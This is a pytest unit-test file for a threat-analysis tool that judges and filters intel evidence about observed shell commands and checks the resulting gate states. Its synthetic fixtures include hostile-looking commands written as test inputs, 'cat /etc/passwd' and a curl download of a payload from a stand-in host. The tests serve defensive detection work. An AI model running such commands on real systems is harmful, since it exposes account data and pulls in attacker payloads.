from __future__ import annotations

from types import SimpleNamespace

import pytest

from ragin.decision_fusion_v4.benchmark import EvidenceQualityGate, deterministic_policy
from ragin.decision_fusion_v4.evidence_export import build_evidence_bundle
from ragin.don.evidence_judge import filter_judged_evidence

pytestmark = pytest.mark.unit


def document(doc_id: str, title: str, content: str, *, source: str = "synthetic://fixture", patterns: list[str] | None = None, tags: list[str] | None = None) -> dict[str, object]:
    return {
        "doc_id": doc_id,
        "title": title,
        "content": content,
        "source": source,
        "metadata": {"command_patterns": patterns or [], "behavior_tags": tags or []},
    }


def analysis(documents: list[dict[str, object]], classification: str = "suspicious") -> SimpleNamespace:
    return SimpleNamespace(
        intel_documents=documents,
        classification=SimpleNamespace(value=classification),
        severity=SimpleNamespace(value="info" if classification == "benign" else "low"),
        confidence=0.5,
        tactics=[],
        iocs=[],
    )


def build(documents: list[dict[str, object]], command: str = "uname -a", **kwargs: object) -> dict[str, object]:
    return build_evidence_bundle(analysis(documents), {"session_id": "synthetic", "classification": {}}, command, **kwargs)


def test_mixed_candidates_are_filtered_before_gate_and_policy() -> None:
    bundle = build(
        [
            document("supported", "uname", "Direct host discovery evidence.", patterns=["uname"], tags=["discovery"]),
            document("irrelevant", "crontab", "Persistence through scheduled tasks.", patterns=["crontab"], tags=["persistence"]),
            document("partial", "system", "Related system context.", patterns=["system"], tags=[]),
        ],
        evidence_judge_filtering=True,
    )
    filtering = bundle["evidence_judge_filter"]
    gate = EvidenceQualityGate().evaluate(bundle)
    policy = deterministic_policy(bundle, gate["valid_doc_ids"])
    assert len(bundle["retrieval"]["documents"]) == 3
    assert filtering["filtered_relevant_doc_ids"] == ["supported"]
    assert set(filtering["excluded_doc_ids"]) == {"irrelevant", "partial"}
    assert filtering["policy_visible_evidence_ids"] == ["supported"]
    assert gate["valid_doc_ids"] == ["supported"]
    assert policy["supporting_evidence_refs"] == ["supported"]


def test_partial_only_evidence_is_not_promoted() -> None:
    bundle = build(
        [document("partial", "accounts", "Related /etc/passwd context without direct behavior support.", patterns=["accounts"], tags=[])],
        command="cat /etc/passwd",
        evidence_judge_filtering=True,
    )
    assert bundle["evidence_judge_filter"]["filtered_sufficiency"] == "INSUFFICIENT"
    assert bundle["retrieval"]["relevant_doc_ids"] == []
    assert bundle["evidence_gate_preview"]["gate_state"] == "NO_EVIDENCE"
    assert bundle["evidence_gate_preview"]["reason_code"] == "no_relevant_documents"


def test_contradictory_relevant_evidence_fails_closed() -> None:
    bundle = build(
        [
            document("support", "curl", "Direct download evidence.", patterns=["curl"], tags=["download"]),
            document("conflict", "curl", "This contradicts the observed download behavior.", patterns=["curl"], tags=["download"]),
        ],
        command="curl http://example.invalid/payload",
        evidence_judge_filtering=True,
    )
    assert bundle["evidence_judge_filter"]["filtered_sufficiency"] == "CONFLICTING"
    assert bundle["retrieval"]["relevant_doc_ids"] == ["support"]
    assert bundle["evidence_gate_preview"]["gate_state"] == "UNRESOLVED_CONFLICT"
    assert bundle["evidence_gate_preview"]["reason_code"] == "evidence_judge_filter_conflicting"


def test_unknown_provenance_cannot_become_policy_visible() -> None:
    bundle = build(
        [document("unknown", "uname", "Direct host discovery evidence.", source="", patterns=["uname"], tags=["discovery"])],
        evidence_judge_filtering=True,
    )
    assert bundle["evidence_judge_filter"]["filtered_relevant_doc_ids"] == []
    assert bundle["evidence_judge_filter"]["unknown_doc_ids"] == ["unknown"]
    assert bundle["evidence_gate_preview"]["gate_state"] == "INVALID_PROVENANCE"


def test_original_relevant_set_is_not_promoted_by_supporting_nonrelevant_document() -> None:
    bundle = build(
        [
            document("nonrelevant", "uname", "Direct host discovery evidence.", patterns=["uname"], tags=["discovery"]),
            document("relevant", "crontab", "Persistence evidence.", patterns=["crontab"], tags=["persistence"]),
        ],
        evidence_judge_filtering=False,
    )
    bundle["retrieval"]["relevant_doc_ids"] = ["relevant"]
    bundle["retrieval"]["relevant_count"] = 1
    judge = bundle["evidence_judge"] if "evidence_judge" in bundle else build(
        [
            document("nonrelevant", "uname", "Direct host discovery evidence.", patterns=["uname"], tags=["discovery"]),
            document("relevant", "crontab", "Persistence evidence.", patterns=["crontab"], tags=["persistence"]),
        ],
        evidence_judge_filtering=True,
    )["evidence_judge"]
    filtered = filter_judged_evidence(bundle["retrieval"], judge)
    assert filtered["filtered_relevant_doc_ids"] == []


def test_filter_trace_rejects_inconsistent_relevant_ids() -> None:
    bundle = build(
        [document("supported", "uname", "Direct host discovery evidence.", patterns=["uname"], tags=["discovery"])],
        evidence_judge_filtering=True,
    )
    bundle["retrieval"]["relevant_doc_ids"] = []
    bundle["retrieval"]["relevant_count"] = 0
    gate = EvidenceQualityGate().evaluate(bundle)
    assert gate["gate_state"] == "RETRIEVAL_FAILURE"
    assert gate["reason_code"] == "inconsistent_evidence_judge_filter"


def test_disabled_mode_preserves_baseline(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.delenv("RAGIN_EVIDENCE_JUDGE_ENABLED", raising=False)
    monkeypatch.delenv("RAGIN_EVIDENCE_JUDGE_FILTERING_ENABLED", raising=False)
    bundle = build([document("supported", "uname", "Direct host discovery evidence.", patterns=["uname"], tags=["discovery"])])
    assert "evidence_judge" not in bundle
    assert "evidence_judge_filter" not in bundle
    assert bundle["evidence_gate_preview"]["gate_state"] == "VALID_EVIDENCE"


def test_filtering_requires_explicit_feature_flag(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("RAGIN_EVIDENCE_JUDGE_FILTERING_ENABLED", "1")
    bundle = build([document("supported", "uname", "Direct host discovery evidence.", patterns=["uname"], tags=["discovery"])])
    assert bundle["evidence_judge_filter"]["filtered_relevant_doc_ids"] == ["supported"]
    assert bundle["evidence_gate_preview"]["gate_state"] == "VALID_EVIDENCE"


def test_ambiguous_command_abstains_in_opt_in_mode() -> None:
    bundle = build(
        [document("support", "echo", "Direct output evidence.", patterns=["echo"], tags=["execution"])],
        command="echo 'unterminated",
        evidence_judge_filtering=True,
    )
    assert bundle["evidence_judge"]["context_missing_or_ambiguous"] is True
    assert bundle["evidence_judge_filter"]["filtered_sufficiency"] == "UNKNOWN"
    assert bundle["evidence_gate_preview"]["gate_state"] == "NO_EVIDENCE"
